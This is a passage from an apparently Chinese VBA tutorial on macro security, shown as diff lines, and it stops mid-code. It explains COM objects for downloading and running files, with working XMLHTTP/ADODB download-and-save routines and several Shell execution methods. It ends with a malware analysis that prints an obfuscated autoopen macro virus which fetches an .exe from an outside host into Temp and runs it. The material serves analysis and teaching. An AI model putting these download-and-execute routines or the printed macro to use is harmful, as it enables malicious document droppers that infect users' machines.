+txt = &quot;Hello World !&quot;
+Debug.Print txt                                           '输出原有的结果
+
+
+strA = Replace(txt, &quot;World&quot;, &quot;World ! Your Are Hacker!&quot;)  '将World替换为World ! Your Are Hacker!
+Debug.Print strA
+
+
+End Sub
+</code></pre>
+
+<p>输出结果</p>
+<pre><code>Hello World !
+Hello World ! Your Are Hacker! !
+</code></pre>
+
+<h4 id="split">Split函数</h4>
+<p>Split函数可以将一个文本以特定的分隔符号拆分为一个以0为下限的一维数组，并返回该数组。</p>
+<pre><code>Split(表达式,拆分符号)
+</code></pre>
+
+<p>参数表达式的位置为一个文本表达式，表示需要被拆分的文本。</p>
+<p>参数拆分符号的位置表示作为分隔符文本表达式。</p>
+<p>示例代码：</p>
+<pre><code>Sub 文本函数_Split函数_04()
+
+    Sheets(&quot;Sheet1&quot;).Select
+    Dim Arr()                                         '声明数组
+    Dim str                                         '存放字符串的位置
+    Dim i As Integer
+    Arr = Range(&quot;B1&quot;).CurrentRegion.Value             '返回活动单元格所在的周围由空行和空列组成的单元格区域
+
+
+    For RowN = 2 To UBound(Arr)                       '返回指定数组维数的最大下标。
+
+
+        Debug.Print &quot;当前单元格数据：&quot; &amp; Arr(RowN, 2)
+
+
+        str = Split(Arr(RowN, 2), &quot;，&quot;)               '分割函数，以，为分割符号
+
+
+        Range(&quot;A13:A50&quot;).ClearContents               '清空整列内容
+        For i = 0 To UBound(str)
+            'Debug.Print str(i)
+            '分隔出来的IP批量输出
+            Cells(13 + i, 1).Select
+            Cells(13 + i, 1).Value = str(i)
+        Next
+
+
+    Next
+
+End Sub
+
+</code></pre>
+
+<p>输出成果：</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326114756724-303855085.png" /></p>
+<p>图13</p>
+<h3 id="12">(12) 文件读写</h3>
+<h4 id="_4">文件遍历</h4>
+<ul>
+<li>Dir函数</li>
+</ul>
+<p>Dir函数用以查找指定路径的文件是否存在，若存在，则返回该文件的文件名，若不存在，则返回空字符(“”)。</p>
+<pre><code>Sub 创建文件清单()
+    Sheets(&quot;Sheet1&quot;).Select
+     Sheet1.Range(&quot;A4:A200&quot;).ClearContents
+
+    '变量声明
+    Dim sPath As String      ' 文件路径
+    Dim sFileName As String  ' 文件名
+    Dim LRowN As Long        ' 结果输出的行号
+
+    ' 获取文件路径，并加入路径分隔符
+    'sPath = Cells(2, 1).Value &amp; Application.PathSeparator   '获取自定义文件路径 &amp; 添加一个\
+
+    ' 返回当前工作簿的路径
+    ' sPath = ThisWorkbook.Path &amp; Application.PathSeparator
+
+
+    ' 返回当前默认文件路径:
+    ' sPath = Application.DefaultFilePath
+
+'
+'    '只返回路径
+    sPath = Application.ActiveWorkbook.Path &amp; Application.PathSeparator
+'
+'    '返回路径及工作簿文件名
+'    sPath = Application.ActiveWorkbook.FullName
+'
+'    '工作簿文件名
+'    sPath = Application.ActiveWorkbook.Name&amp;
+
+
+    ' 设定起始行号为4
+    LRowN = 4
+    '查找文件
+    sFileName = Dir(sPath &amp; &quot;*&quot;, vbDirectory)
+    '当文件被找到时，不断循环
+    Do While sFileName &lt;&gt; &quot;&quot;
+    '输出文件名
+    Cells(LRowN, 1).Value = sFileName
+    '查找下一个
+    sFileName = Dir
+    ' 结果输出行号增加1
+    LRowN = LRowN + 1
+    Loop
+
+
+End Sub
+
+</code></pre>
+
+<p>输出结果：
+<img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326125556886-953023455.png" /></p>
+<h4 id="_5">文件属性</h4>
+<ul>
+<li>GetAtt函数</li>
+</ul>
+<pre><code>GetAttr(pathname)
+</code></pre>
+
+<p>其中参数pathname为文件或文件夹的完整路径，返回值为文件的属性，具体如下表：</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326132436418-1753786546.png" /></p>
+<ul>
+<li>SetAttr函数</li>
+</ul>
+<pre><code>SetAttr pathname,attributes
+</code></pre>
+
+<p>其中参数pathname为文件的完整路径。参数attrbutes表示修改后的文件属性。</p>
+<p>示例代码：</p>
+<pre><code>Sub 文件属性02()
+
+
+    ' 获取文件属性
+   StrAttr = GetAttr(&quot;C:\Users\AT\Desktop\课程附件\01-Auto_Open()_启用宏.xlsm&quot;)
+
+   If StrAttr = 0 Then
+      Debug.Print &quot;无属性文件&quot;
+   ElseIf StrAttr = 16 Then
+      Debug.Print &quot;文件夹&quot;
+   ElseIf StrAttr = 2 Then
+      Debug.Print &quot;隐藏文件&quot;
+   End If
+
+
+    ' 设置文件属性
+    SetAttr &quot;C:\Users\AT\Desktop\课程附件\01-Auto_Open()_启用宏.xlsm&quot;, vbHidden
+
+
+End Sub
+
+
+</code></pre>
+
+<ul>
+<li>FileCopy函数</li>
+</ul>
+<p>FileCopy语句可以复制文件并重新命名，其语法为：</p>
+<pre><code>FileCopy source,destnation
+</code></pre>
+
+<p>其中，参数source为源文件的完整路径，包括文件路径和文件名。
+参数destination为目标文件的完整路径，包括文件路径和文件名。</p>
+<p>示例代码：</p>
+<pre><code>Sub 操作文件_复制文件03()
+    '容错代码
+    On Error Resume Next
+
+
+    '变量声明
+    Dim sPathOld As String  ' 源文件夹路径
+    Dim sPathNew As String  ' 目标文件夹名字
+
+    Dim sFileNameOld As String '旧文件名
+    Dim sFileNameNew As String '新文件名
+
+    '获取源文件夹路径
+    sPathOld = ThisWorkbook.Path &amp; &quot;\&quot;
+
+    sPathNew = ThisWorkbook.Path &amp; &quot;\FileCopy_test\&quot;
+
+
+    '获取目标文件夹路径下有没有test目录
+    If Dir(sPathNew, 16) = Empty Then
+        '如果没有就创建文件夹
+        VBA.MkDir (sPathNew)
+    End If
+
+    '查找源文件夹中的文件
+    sFileNameOld = Dir(sPathOld &amp; &quot;*&quot;)
+    '当查找结果存在时不断循环
+    Do While sFileNameOld &lt;&gt; &quot;&quot;
+       '设定新文件名
+        sFileNameNew = sFileNameOld &amp; &quot;.Bak&quot;
+        ' 复制文件名并改名
+        FileCopy sPathOld &amp; sFileNameOld, sPathNew &amp; sFileNameNew
+
+        '查找下一个文件
+       sFileNameOld = Dir
+    Loop
+
+End Sub
+</code></pre>
+
+<p>输出结果：</p>
+<p><img alt="" src="https://images2018.cnblogs.com/blog/549050/201803/549050-20180326142656306-2036368207.png" /></p>
+<p>图14</p>
+<h2 id="3_1">3、常用对象</h2>
+<p>VBS本身是无法执行命令的，只有通过创建对象的方式调用组件才可以执行命令。</p>
+<ul>
+<li>CreateObject 函数</li>
+</ul>
+<p>创建并返回对ActiveX 对象的引用。</p>
+<p>语法如下：</p>
+<pre><code>CreateObject (类、 [服务器名称]）
+
+Dim ExcelSheet As Object
+Set ExcelSheet = CreateObject(&quot;Object&quot;)
+</code></pre>
+
+<p>CreateObject函数创建的是COM对象，第一个参数是COM对象的ProgID。</p>
+<p>查看示例程序【13-CreatObject().xlsm】-01，可以遍历出在操作系统中我们可以使用的对象。</p>
+<p>常用的对象如下：</p>
+<pre><code>ADODB.Stream
+Msxml2.XMLHTTP
+Shell.Application
+Scripting.FileSystemObject
+
+WScript.Shell
+InternetExplorer.Application
+</code></pre>
+
+<h4 id="1-adodbstream">(1) ADODB.Stream 对象</h4>
+<p>常用方法</p>
+<ul>
+<li>
+<ul>
+<li>Mode</li>
+</ul>
+</li>
+</ul>
+<p>打开模式</p>
+<pre><code>属性 为打开模式 1.只读 2.只写 3.读写 
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>Type </li>
+</ul>
+</li>
+</ul>
+<p>Type 指定或返回的数据类型，可选参数为：</p>
+<pre><code>     adTypeBinary = 1 二进制形式打开
+     adTypeText = 2  文本形式打开
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>Open</li>
+</ul>
+</li>
+</ul>
+<p>打开对象</p>
+<p>参数说明：Sourece 对象源，可不指定参数</p>
+<pre><code>
+Object.Open(Source,[Mode],[Options],[UserName],[Password])
+
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>Write</li>
+</ul>
+</li>
+</ul>
+<p>说明：将指定的数据装入对象中。</p>
+<pre><code>
+Object.Write(Buffer)
+
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>WriteText</li>
+</ul>
+</li>
+</ul>
+<p>说明：将指定的文本数据装入对像中。
+参数说明：Data 为指定的要写入的内容。
+使用方法如下：</p>
+<pre><code>
+Object.Write(Data,[Options])
+
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>SaveToFile </li>
+</ul>
+</li>
+</ul>
+<p>说明：将对像的内容写到FileName指定的文件中
+参数说明：FileName指定的文件</p>
+<pre><code>
+Object.SaveToFile(FileName,[Options]) 
+
+</code></pre>
+
+<p>Options 存取的选项，可不指定，可选参数如下：</p>
+<p>adSaveCreateNotExist =1</p>
+<p>adSaveCreateOverWrite =2 </p>
+<p>示例代码：</p>
+<p>ADODB_Stream对象02</p>
+<pre><code>Sub ADODB_Stream对象()
+
+    'adTypeBinary = 1 二进制形式打开
+    'adTypeText = 2  文本形式打开
+
+     Const adTypeBinary = 2
+
+     '属性 为打开模式 1.只读 2.只写 3.读写
+
+     Const adSaveCreateOverwrite = 2
+
+     Const adModeReadWrite = 3
+
+     contents = &quot;I am Nobaddy&quot;                 ' 保存的文本
+
+     Set oStr = CreateObject(&quot;ADODB.Stream&quot;)   ' 创建对象
+
+     oStr.Mode = adModeReadWrite               ' 指定打开模式
+
+     oStr.Type = adTypeBinary                  ' 打开类型
+
+     oStr.Open                                 ' 打开文件
+
+     oStr.WriteText contents                   ' 保存文件的方式  WriteText 或者 Write
+
+     oStr.SaveToFile ThisWorkbook.Path &amp; &quot;\ADODB_Stream_Test.txt&quot;, adSaveCreateOverwrite
+
+
+End Sub
+
+
+</code></pre>
+
+<h4 id="2-msxml2xmlhttp">(2) Msxml2.XMLHTTP 对象</h4>
+<p>XMLHTTP是个传送XML格式数据的超文本传输协议。 </p>
+<p>它上传的指令可以是XML格式数据，也可以是字符串，流，或者一个无符号整数数组。还可以是URL的参数。 </p>
+<ul>
+<li>
+<ul>
+<li>Open</li>
+</ul>
+</li>
+</ul>
+<p>以什么方式打开网页</p>
+<pre><code>open(bstrMethod, bstrUrl, varAsync, bstrUser, bstrPassword)
+
+bstrMethod： 数据传送方式，即GET或POST。用&quot;POST&quot;方式发送数据,可以大到4MB，也可以换为&quot;GET&quot;，只能256KB。
+
+bstrUrl： 服务网页的URL。 
+
+varAsync： 是否同步执行。缺省为True，即同步执行，但只能在DOM中实施同步执行。用中一般将其置为False，即异步执行。 
+
+bstrUser： 用户名，可省略。 
+
+bstrPassword：用户口令，可省略。 
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>Send</li>
+</ul>
+</li>
+</ul>
+<p>varBody：指令集。可以是XML格式数据，也可以是字符串，流，或者一个无符号整数数组。也可以省略，让指令通过Open方法的URL参数代入。发送数据的方式分为同步和异步两种。在异步方式下，数据包一旦发送完毕，就结束Send进程，客户机执行的操作；而在同步方式下，客户机要等到服务器返回确认消息后才结束Send进程。</p>
+<ul>
+<li>
+<ul>
+<li>返回内容</li>
+</ul>
+</li>
+</ul>
+<pre><code>readyState
+
+XMLHTTP对象中的readyState属性能够反映出服务器在处理请求时的进展状况。客户机的程序可以根据这个状态信息设置相应的事件处理方法。属性值及其含义如下表所示：
+值 说明
+0 Response对象已经创建，但XML文档上载过程尚未结束
+1 XML文档已经装载完毕
+2 XML文档已经装载完毕，正在处理中
+3 部分XML文档已经解析
+4 文档已经解析完毕，客户端可以接受返回消息
+
+responseBody
+
+Variant型 结果返回为无符号整数数组
+
+responseStream
+
+Variant型 结果返回为IStream流
+
+responseText
+
+string型 结果返回为字符串。
+
+responseXML
+
+object型 结果返回为XML格式数据。
+
+</code></pre>
+
+<p>Msxml2.XMLHTTP 和 Microsoft.XMLHTTP 都好用，当遇到HTTPS的情况需要特殊处理。</p>
+<p>从HTTPS网站下载EXE方法如下：</p>
+<pre><code>方法1：添加一个http.SetOption 2,13056 忽略https错误，注意写入权限
+方法2：使用WinHttp.WinHttpRequest.5.1对象
+方法3：使用Msxml2.ServerXMLHTTP.6.0
+</code></pre>
+
+<p>示例代码：</p>
+<p>模块：XMLHTTP对象03</p>
+<pre><code>Sub XMLHTTP对象03_01()
+
+    myURL = &quot;file://C:\Windows\System32\calc.exe&quot;
+    Set Post = CreateObject(&quot;Microsoft.XMLHTTP&quot;)  '建立XMLHTTP对象
+    Post.Open &quot;GET&quot;, myURL, 0                     '打开方法
+    Post.Send                                     '发送
+    Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
+    aGet.Mode = 3
+    aGet.Type = 1
+    aGet.Open
+    aGet.Write (Post.responseBody)                '把获取到的内容保存到本地
+    aGet.SaveToFile ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;, 2
+
+
+
+End Sub
+
+
+Sub XMLHTTP对象03_02()
+    myURL = &quot;file://C:\Windows\System32\calc.exe&quot;
+
+    Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
+    Post.Open &quot;GET&quot;, myURL, 0
+    Post.Send
+
+    Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
+    aGet.Mode = 3
+    aGet.Type = 1
+    aGet.Open
+    aGet.Write (Post.responseBody)
+    aGet.SaveToFile ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;, 2
+
+End Sub
+
+
+'下载https的方法1
+
+'加一个http.SetOption 2,13056 忽略https错误，注意写入权限
+Sub XMLHTTP对象03_03()
+
+    Const adTypeBinary = 1
+    Const adSaveCreateOverWrite = 2
+    Dim http, ado
+    Set http = CreateObject(&quot;Msxml2.serverXMLHTTP&quot;)
+    http.SetOption 2, 13056                                      '忽略HTTPS的错误
+    http.Open &quot;GET&quot;, &quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;, False
+    http.Send
+    Set ado = CreateObject(&quot;Adodb.Stream&quot;)
+    ado.Type = adTypeBinary
+    ado.Open
+    ado.Write http.responseBody
+    ado.SaveToFile ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;, 2
+    ado.Close
+
+End Sub
+
+'下载https的方法2
+'使用WinHttp.WinHttpRequest.5.1
+Sub XMLHTTP对象03_04()
+
+    Const adTypeBinary = 1
+    Const adSaveCreateOverWrite = 2
+    Dim http, ado
+    Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) '调用WinHttp.WinHttpRequest.5.1                        '
+
+    http.Open &quot;GET&quot;, &quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;, False
+    http.Send
+    Set ado = CreateObject(&quot;Adodb.Stream&quot;)
+    ado.Type = adTypeBinary
+    ado.Open
+    ado.Write http.responseBody
+    ado.SaveToFile ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;, 2
+    ado.Close
+
+End Sub
+
+
+'下载https的方法3
+'使用Msxml2.ServerXMLHTTP.6.0
+
+Sub XMLHTTP对象03_05()
+
+    Const adTypeBinary = 1
+    Const adSaveCreateOverWrite = 2
+    Dim http, ado
+    Set http = CreateObject(&quot;Msxml2.ServerXMLHTTP.6.0&quot;)  '调用Msxml2.ServerXMLHTTP.6.0                  '
+
+    http.Open &quot;GET&quot;, &quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;, False
+    http.Send
+    Set ado = CreateObject(&quot;Adodb.Stream&quot;)
+    ado.Type = adTypeBinary
+    ado.Open
+    ado.Write http.responseBody
+    ado.SaveToFile ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;, 2
+    ado.Close
+
+End Sub
+
+</code></pre>
+
+<h4 id="3_2">(3) 执行命令对象与函数</h4>
+<ul>
+<li>
+<ul>
+<li>Shell函数</li>
+</ul>
+</li>
+</ul>
+<p>执行一个程序。</p>
+<p>参数说明：</p>
+<ul>
+<li>vbHide 0 :隐藏窗口并将焦点传递给隐藏的窗口</li>
+</ul>
+<pre><code>Shell &quot;程序路径&quot;,0
+
+Shell ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;, 0  ' Shell函数
+
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>Shell.Application对象</li>
+</ul>
+</li>
+</ul>
+<p>参数说明：</p>
+<ul>
+<li>NameSpace() 返回指定文件夹的Folder类目标</li>
+<li>Items()     返回FolderItems目标</li>
+<li>Item()      获取FolderItems目标的某个值的索引</li>
+<li>InvokeVerb  打开目标（运行程序）</li>
+<li>Open        打开程序</li>
+<li>Verbs       得到FolderItemVerbs类目标</li>
+<li>FileRun     运行程序</li>
+</ul>
+<p>示例代码：</p>
+<pre><code>Sub shell_application对象04()
+
+Set objShellApp = CreateObject(&quot;Shell.Application&quot;)
+Set objFolder = objShellApp.Namespace(ThisWorkbook.Path &amp; &quot;\&quot;)
+objFolder.Items().Item(&quot;XMLHTTP_calc.exe&quot;).invokeverb              '方法1
+objFolder.Items().Item(&quot;XMLHTTP_calc.exe&quot;).InvokeVerbEx            '方法2
+objShellApp.Open (ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;)         '方法3
+objShellApp.ShellExecute &quot;XMLHTTP_calc.exe&quot;, &quot;&quot;, ThisWorkbook.Path &amp; &quot;\&quot;, &quot;&quot;, &quot;1&quot; '方法4,可以加参数和设置参数值
+
+
+Set objFolderItem = objShellApp.Namespace(ThisWorkbook.Path &amp; &quot;\&quot;).Items().Item(&quot;XMLHTTP_calc.exe&quot;)  '方法5
+Set objFIVs = objFolderItem.Verbs()
+For i = 0 To objFIVs.Count - 1
+    'MsgBox objFIVs.Item(i)
+    Set objFIV = objFIVs.Item(i)
+    If objFIV.Name = &quot;打开(&amp;O)&quot; Then '右键菜单中在中文系统是&quot;打开(&amp;O)&quot;，英文自己改
+        objFIV.DoIt                      '执行程序
+        Exit For
+    End If
+Next
+
+objShellApp.FileRun ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;  '方法6
+
+End Sub
+
+
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>Wscript.Shell对象</li>
+</ul>
+</li>
+</ul>
+<p>参数说明：</p>
+<ul>
+<li>Run   运行应用程序</li>
+</ul>
+<p>示例代码：</p>
+<pre><code>Sub Wscript_Shell对象01()
+
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+
+objShell.Run ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;
+
+
+Set objShell_1 = CreateObject(&quot;Wscript.Shell.1&quot;)
+
+objShell_1.Run ThisWorkbook.Path &amp; &quot;\XMLHTTP_calc.exe&quot;
+
+End Sub
+
+</code></pre>
+
+<h2 id="4_1">4、案例：宏病毒分析</h2>
+<p>目前遇到的纯用宏感染的病毒家族APMP(感染性)、lokcy(勒索者)、ATP(钓鱼邮件)。</p>
+<h4 id="1_3">(1) 调试环境</h4>
+<ul>
+<li>操作系统：Windows 7</li>
+<li>监控与调试工具：WireShark、火绒剑、文档自带宏编译器</li>
+<li>样本HASH值：b5ee8925742637a8484f6e1cb08a1c989cb4a8f9e66a8179c929dd789c07c06d</li>
+</ul>
+<h4 id="2_3">(2) 调试过程</h4>
+<p>样本是从某平台上看到的文章《一款流行的VBA宏病毒技术分析》根据IOC搜索出来的</p>
+<ul>
+<li>思路：</li>
+</ul>
+<p>程序主函数-&gt;调用的对象-&gt;网络行为-&gt;文件行为</p>
+<ul>
+<li>主函数</li>
+</ul>
+<p>ThisDocument 模块下的 autoopen() 函数。</p>
+<pre><code>主函数
+Sub autoopen()
+
+' 传了个数值
+VEeve (8.2)
+
+End Sub
+
+' 调用函数
+Sub VEeve(FFFFF As Long)
+
+' 调用病毒主函数
+LWS8UPvw1QGKq
+
+End Sub
+
+</code></pre>
+
+<ul>
+<li>病毒主函数代码分析</li>
+</ul>
+<p>进入LWS8UPvw1QGKq函数，F8单步跟踪。</p>
+<ul>
+<li>
+<ul>
+<li><strong>网络行为主要实现</strong></li>
+</ul>
+</li>
+</ul>
+<p>通过关键函数调试，使用Debug.Print输出的加密函数内容。</p>
+<pre><code>' 加密字符串 ht=tp:/;/chateau-d&lt;es-iles.=com/&lt;4tf32018/4/3 11:40:07 : WScript.Shell
+Nrh1INh1S5hGed = &quot;h&quot; &amp; Chr(116) &amp; Chr(61) &amp; &quot;t&quot; &amp; Chr(112) &amp; Chr(58) &amp; Chr(47) &amp; Chr(59) &amp; Chr(47) &amp; Chr(99) &amp; Chr(104) &amp; Chr(97) &amp; &quot;t&quot; &amp; Chr(101) &amp; Chr(97) &amp; Chr(117) &amp; Chr(45) &amp; Chr(100) &amp; Chr(60) &amp; Chr(101) &amp; Chr(115) &amp; Chr(45) &amp; Chr(105) &amp; Chr(108) &amp; &quot;e&quot; &amp; Chr(115) &amp; Chr(46) &amp; Chr(61) &amp; Chr(99) &amp; Chr(111) &amp; Chr(109) &amp; Chr(47) &amp; Chr(60) &amp; Chr(52) &amp; Chr(116) &amp; Chr(102) &amp; Chr(51) &amp; Chr(51) &amp; Chr(119) &amp; Chr(47) &amp; Chr(60) &amp; Chr(119) &amp; &quot;4&quot; &amp; Chr(116) &amp; Chr(52) &amp; Chr(53) &amp; Chr(51) &amp; Chr(46) &amp; Chr(59) &amp; Chr(101) &amp; Chr(61) &amp; Chr(120) &amp; Chr(101)
+
+Debug.Print Now &amp; &quot; : &quot; &amp; Nrh1INh1S5hGed  '输出加密字符串内容
+
+' 进入解密函数，创建了对象 Microsoft.XMLHTTP
+Set LhZitls7wPn = lLJrFk6pKsSYJ(&quot;M&quot; &amp; &quot;i&quot; &amp; Chr(60) &amp; Chr(99) &amp; Chr(114) &amp; Chr(111) &amp; Chr(61) &amp; &quot;s&quot; &amp; Chr(111) &amp; &quot;f&quot; &amp; Chr(116) &amp; &quot;;&quot; &amp; Chr(46) &amp; &quot;X&quot; &amp; Chr(77) &amp; Chr(60) &amp; &quot;L&quot; &amp; Chr(59) &amp; Chr(72) &amp; &quot;T&quot; &amp; Chr(61) &amp; Chr(84) &amp; &quot;P&quot;)
+
+' 解密字符串http://chateau-des-iles.com/4tf33w/w4t453.exe
+
+Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed, Chr(60), &quot;&quot;), Chr(61), &quot;&quot;), Chr(59), &quot;&quot;)
+
+'  下载文件
+'  LhZitls7wPn = Microsoft.XMLHTTP
+'  LhZitls7wPn.Open GET &quot;http://chateau-des-iles.com/4tf33w/w4t453.exe&quot;
+CallByName LhZitls7wPn, Chr(79) &amp; Chr(112) &amp; Chr(101) &amp; Chr(110), VbMethod, Chr(71) &amp; Chr(69) &amp; Chr(84), _
+Nrh1INh1S5hGed _
+, False
+</code></pre>
+
+<p><strong>加密函数lLJrFk6pKsSYJ：</strong></p>
+<p>其中各种乱序的字符串会调用lLJrFk6pKsSYJ函数做解密函数使用，目的是为了将&lt; = ;这些符号替换成空。</p>
+<p>使用Debug.Print就可以输出每次被替换出来的真实内容。</p>
+<pre><code>' 解密函数
+Public Function lLJrFk6pKsSYJ(L9QLFPTuZDwM As String)
+
+' 替换 60 &lt;    61  =   59 ;
+L9QLFPTuZDwM = Replace(Replace(Replace(L9QLFPTuZDwM, Chr(60), &quot;&quot;), Chr(61), &quot;&quot;), Chr(59), &quot;&quot;)
+
+' 获取每次解密后的内容
+Debug.Print Now &amp; &quot; : &quot; &amp; L9QLFPTuZDwM
+
+' 这个函数会将加密后的字符串解密，然后创建对象的实例
+Set lLJrFk6pKsSYJ = CreateObject(L9QLFPTuZDwM)
+
+End Function
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>运行文件实现</li>
+</ul>
+</li>
+</ul>
+<pre><code>'  通过对象下载文件
+'  LhZitls7wPn = Microsoft.XMLHTTP
+'  LhZitls7wPn.Open GET &quot;http://chateau-des-iles.com/4tf33w/w4t453.exe&quot;
+CallByName LhZitls7wPn, Chr(79) &amp; Chr(112) &amp; Chr(101) &amp; Chr(110), VbMethod, Chr(71) &amp; Chr(69) &amp; Chr(84), _
+Nrh1INh1S5hGed _
+, False
+
+
+' vu2Wh85645xcP0 = 创建WScript.Shell对象实例
+Set vu2Wh85645xcP0 = lLJrFk6pKsSYJ(Chr(87) &amp; &quot;&lt;&quot; &amp; Chr(83) &amp; &quot;c&quot; &amp; Chr(61) &amp; Chr(114) &amp; &quot;i&quot; &amp; Chr(112) &amp; &quot;t&quot; &amp; Chr(59) &amp; Chr(46) &amp; Chr(83) &amp; &quot;=&quot; &amp; Chr(104) &amp; &quot;e&quot; &amp; &quot;&lt;&quot; &amp; &quot;l&quot; &amp; Chr(108))
+
+'  WScript.Shell &quot;Environment&quot; Process
+Set GhbwRqU9OkbF = CallByName(vu2Wh85645xcP0, Chr(69) &amp; Chr(110) &amp; &quot;v&quot; &amp; Chr(105) &amp; Chr(114) &amp; Chr(111) &amp; &quot;n&quot; &amp; &quot;m&quot; &amp; Chr(101) &amp; Chr(110) &amp; Chr(116), VbGet, Chr(80) &amp; &quot;r&quot; &amp; &quot;o&quot; &amp; Chr(99) &amp; &quot;e&quot; &amp; Chr(115) &amp; &quot;s&quot;)
+
+' &quot;C:\Users\USER\AppData\Local\Temp&quot;
+SD3q5HdXxoiA = GhbwRqU9OkbF(Chr(84) &amp; Chr(69) &amp; Chr(77) &amp; Chr(80))
+
+' &quot;C:\Users\USER\AppData\Local\Temp\fghgkbb.exe&quot;
+aDPbd2byZb = SD3q5HdXxoiA &amp; &quot;\&quot; &amp; Chr(102) &amp; Chr(103) &amp; Chr(104) &amp; Chr(103) &amp; Chr(107) &amp; Chr(98) &amp; Chr(98) &amp; Chr(46) &amp; &quot;e&quot; &amp; &quot;x&quot; &amp; Chr(101)
+
+Dim bvGEpxCVsZ() As Byte
+
+' http  send
+CallByName LhZitls7wPn, Chr(83) &amp; Chr(101) &amp; Chr(110) &amp; Chr(100), VbMethod
+' &quot;responseBody&quot;
+bvGEpxCVsZ = CallByName(LhZitls7wPn, &quot;r&quot; &amp; &quot;e&quot; &amp; Chr(115) &amp; Chr(112) &amp; Chr(111) &amp; Chr(110) &amp; Chr(115) &amp; Chr(101) &amp; Chr(66) &amp; Chr(111) &amp; Chr(100) &amp; &quot;y&quot;, VbGet)
+' 保存文件
+FlvXHsDrWT3aY bvGEpxCVsZ, aDPbd2byZb
+On Error GoTo OhXhZLRKh
+    a = 84 / 0
+  On Error GoTo 0
+
+' 退出函数
+xrIvr6mOXvFG:
+  Exit Sub
+' 进入
+OhXhZLRKh:
+  ' 执行命令函数
+  ENMD3t8EY4A (&quot;UfBPGay4VPJi&quot;)
+Resume xrIvr6mOXvFG
+End Sub
+
+</code></pre>
+
+<p>完整函数代码：</p>
+<pre><code>'病毒主函数
+Sub LWS8UPvw1QGKq()
+
+' 加密字符串 ht=tp:/;/chateau-d&lt;es-iles.=com/&lt;4tf32018/4/3 11:40:07 : WScript.Shell
+Nrh1INh1S5hGed = &quot;h&quot; &amp; Chr(116) &amp; Chr(61) &amp; &quot;t&quot; &amp; Chr(112) &amp; Chr(58) &amp; Chr(47) &amp; Chr(59) &amp; Chr(47) &amp; Chr(99) &amp; Chr(104) &amp; Chr(97) &amp; &quot;t&quot; &amp; Chr(101) &amp; Chr(97) &amp; Chr(117) &amp; Chr(45) &amp; Chr(100) &amp; Chr(60) &amp; Chr(101) &amp; Chr(115) &amp; Chr(45) &amp; Chr(105) &amp; Chr(108) &amp; &quot;e&quot; &amp; Chr(115) &amp; Chr(46) &amp; Chr(61) &amp; Chr(99) &amp; Chr(111) &amp; Chr(109) &amp; Chr(47) &amp; Chr(60) &amp; Chr(52) &amp; Chr(116) &amp; Chr(102) &amp; Chr(51) &amp; Chr(51) &amp; Chr(119) &amp; Chr(47) &amp; Chr(60) &amp; Chr(119) &amp; &quot;4&quot; &amp; Chr(116) &amp; Chr(52) &amp; Chr(53) &amp; Chr(51) &amp; Chr(46) &amp; Chr(59) &amp; Chr(101) &amp; Chr(61) &amp; Chr(120) &amp; Chr(101)
+
+Debug.Print Now &amp; &quot; : &quot; &amp; Nrh1INh1S5hGed
+
+' 进入解密函数，创建了对象 Microsoft.XMLHTTP
+Set LhZitls7wPn = lLJrFk6pKsSYJ(&quot;M&quot; &amp; &quot;i&quot; &amp; Chr(60) &amp; Chr(99) &amp; Chr(114) &amp; Chr(111) &amp; Chr(61) &amp; &quot;s&quot; &amp; Chr(111) &amp; &quot;f&quot; &amp; Chr(116) &amp; &quot;;&quot; &amp; Chr(46) &amp; &quot;X&quot; &amp; Chr(77) &amp; Chr(60) &amp; &quot;L&quot; &amp; Chr(59) &amp; Chr(72) &amp; &quot;T&quot; &amp; Chr(61) &amp; Chr(84) &amp; &quot;P&quot;)
+
+' 解密字符串http://chateau-des-iles.com/4tf33w/w4t453.exe
+
+Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed, Chr(60), &quot;&quot;), Chr(61), &quot;&quot;), Chr(59), &quot;&quot;)
+
+'  通过对象下载文件
+'  LhZitls7wPn = Microsoft.XMLHTTP
+'  LhZitls7wPn.Open GET &quot;http://chateau-des-iles.com/4tf33w/w4t453.exe&quot;
+CallByName LhZitls7wPn, Chr(79) &amp; Chr(112) &amp; Chr(101) &amp; Chr(110), VbMethod, Chr(71) &amp; Chr(69) &amp; Chr(84), _
+Nrh1INh1S5hGed _
+, False
+
+
+' vu2Wh85645xcP0 = 创建WScript.Shell对象实例
